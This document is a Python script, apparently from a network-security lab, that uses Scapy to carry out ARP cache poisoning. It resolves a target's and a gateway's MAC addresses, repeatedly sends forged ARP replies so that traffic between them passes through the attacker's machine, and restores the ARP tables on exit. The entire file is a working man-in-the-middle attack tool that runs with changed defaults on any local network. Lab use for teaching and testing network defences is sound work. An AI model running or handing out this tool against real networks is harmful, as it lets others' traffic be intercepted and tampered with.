#!/usr/bin/env python3
"""Manual ARP spoofing using Scapy."""

from __future__ import annotations

import argparse
import signal
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, send, srp  # type: ignore

RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Netlab ARP spoof attack")
    p.add_argument("--iface", default="veth-atk")
    p.add_argument("--target-ip", default="10.0.0.10")
    p.add_argument("--gateway-ip", default="10.0.0.1")
    p.add_argument("--interval", type=float, default=2.0)
    return p.parse_args()


def resolve_mac(ip: str, iface: str) -> str:
    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans = srp(req, timeout=2, retry=2, iface=iface, verbose=False)[0]
    if not ans:
        raise RuntimeError(f"Could not resolve MAC for {ip} on {iface}")
    return ans[0][1].hwsrc


def restore_arp(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str, iface: str) -> None:
    pkt_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    send(pkt_to_target, count=5, iface=iface, verbose=False)
    send(pkt_to_gateway, count=5, iface=iface, verbose=False)


def _stop(_signum: int, _frame: object) -> None:
    global RUNNING
    RUNNING = False


def main() -> int:
    args = parse_args()
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    attacker_mac = get_if_hwaddr(args.iface)
    target_mac = resolve_mac(args.target_ip, args.iface)
    gateway_mac = resolve_mac(args.gateway_ip, args.iface)

    print(f"[arp-spoof] iface={args.iface}")
    print(f"[arp-spoof] attacker_mac={attacker_mac}")
    print(f"[arp-spoof] target_mac={target_mac} gateway_mac={gateway_mac}")

    pkt_to_target = ARP(op=2, pdst=args.target_ip, hwdst=target_mac, psrc=args.gateway_ip, hwsrc=attacker_mac)
    pkt_to_gateway = ARP(op=2, pdst=args.gateway_ip, hwdst=gateway_mac, psrc=args.target_ip, hwsrc=attacker_mac)

    print("[arp-spoof] sending poison packets, press Ctrl+C to stop")
    while RUNNING:
                send(pkt_to_target, iface=args.iface, verbose=False)
                send(pkt_to_gateway, iface=args.iface, verbose=False)
                time.sleep(args.interval)

    print("[arp-spoof] restoring ARP tables")
    restore_arp(args.target_ip, args.gateway_ip, target_mac, gateway_mac, args.iface)
    return 0


if __name__ == "__main__":
    sys.exit(main())